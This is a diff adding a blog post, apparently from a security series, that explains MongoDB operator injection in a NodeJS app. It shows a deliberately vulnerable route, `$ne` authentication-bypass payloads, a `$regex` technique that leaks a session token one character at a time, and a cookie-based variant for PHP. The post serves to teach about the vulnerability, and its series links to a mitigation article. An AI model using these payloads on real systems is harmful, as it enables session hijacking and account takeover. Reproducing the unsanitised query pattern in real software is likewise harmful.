@@ -1,0 +1,87 @@
+# MongoDB NoSQL Operator Injection: Cracking Sessions
+
+<p className="text-xs text-right">August 9, 2020 by [patrickd](/about#patrickd)</p>
+
+This article discusses how Operator Injection in MongoDB may be used for efficiently cracking a secret session token and therefore breaking authentication. 
+
+## Exploit
+
+Let's assume we have a NodeJS application with an authentication system that stores its API access tokens within a `sessions` collection together with the ID of the user that the session belongs to:
+
+```javascript
+{
+  "token": "sG21bUPlH9ywz1MtA9O1tPuEaZU8pm7J",
+  "userId": ObjectId("5f1caba000aa76a6263c1854")
+}
+```
+
+The following is a `GET /me{:http}` route that makes use of that system and returns information for the currently authenticated user:
+
+```javascript javascript showLineNumbers filename="Route Controller" /req.query.access_token/
+// GET /me?access_token=sG21bUPlH9ywz1MtA9O1tPuEaZU8pm7J
+app.get('/me', async (req) => {
+  // Authenticate.
+  const session = sessions.findOne({ token: req.query.access_token });
+  if (!session) {
+    throw new AccessDeniendError('Invalid session access token');
+  }
+  // Return authenticated user information.
+  return users.findOne({ _id: session.userId });
+});
+```
+
+As in [the previous article](/posts/2020/7/25/iterating-collections-mongodb-nosql-operator-injection) we can again use query parameters to specify an object instead of the expected access_token string (`?key[field]=value{:js}`) in order to inject an operator into the database query.
+
+While it's simple to use the not-equal (`$ne`) operator to authenticate with the first session found in database (by [natural order](https://docs.mongodb.com/manual/reference/glossary/#term-natural-order), not unlikely to be an admin user), we won't be able obtain the actual access_token that was used as part of the response.
+
+```bash
+GET /users?access_token[$ne]=_nothing_will_match_this_
+```
+
+But as the target value is a string we can now make use of the [Regular Expression Matching Operator](https://docs.mongodb.com/manual/reference/operator/query/regex/) (`$regex`), allowing us to iterate the token's alphabet – character by character:
+
+```bash
+GET /users?access_token[$regex]=^a
+  -> denied / wrong user
+GET /users?access_token[$regex]=^b
+  -> denied / wrong user
+GET /users?access_token[$regex]=^c
+  -> denied / wrong user
+...
+GET /users?access_token[$regex]=^s
+  -> ok / correct user
+  -> token starts with "s"
+GET /users?access_token[$regex]=^sa
+  -> denied / wrong user
+GET /users?access_token[$regex]=^sb
+  -> denied / wrong user
+GET /users?access_token[$regex]=^sc
+  -> denied / wrong user
+...
+```
+
+Compared to attempting to determine the token by brute force (up to $52^{32}$ requests necessary in this example), this is a much more practical way to "crack" a session (only up to $52*32$ requests necessary).
+
+## Caveats
+
+For user facing applications, sessions are more commonly stored in cookies rather than being passed as query parameters. It appears that the most common cookie-parsing libraries for NodeJS do not parse objects specified in the cookie's query-string.
+
+Note however that the behavior is different for other cookie parsers: For example, sending `Cookie: session[$ne]=_nothing_will_match_this_` as HTTP header to a PHP7 Server will be decoded as an object for the `$_COOKIE` global making it a potential attack vector for the described exploit.
+
+---
+
+import { Card, Cards } from 'nextra/components'
+import { NewsletterIcon } from '@components/icons'
+
+<Cards>
+  <Card
+    icon={<NewsletterIcon />}
+    title="← MongoDB NoSQL Operator Injection: Iterating Collections"
+    href="/posts/2020/7/25/iterating-collections-mongodb-nosql-operator-injection/"
+  />
+  <Card
+    icon={<NewsletterIcon />}
+    title="MongoDB NoSQL Operator Injection: Mitigation →"
+    href="/posts/2020/9/6/mongodb-nosql-operator-injection-mitigation"
+  />
+</Cards>
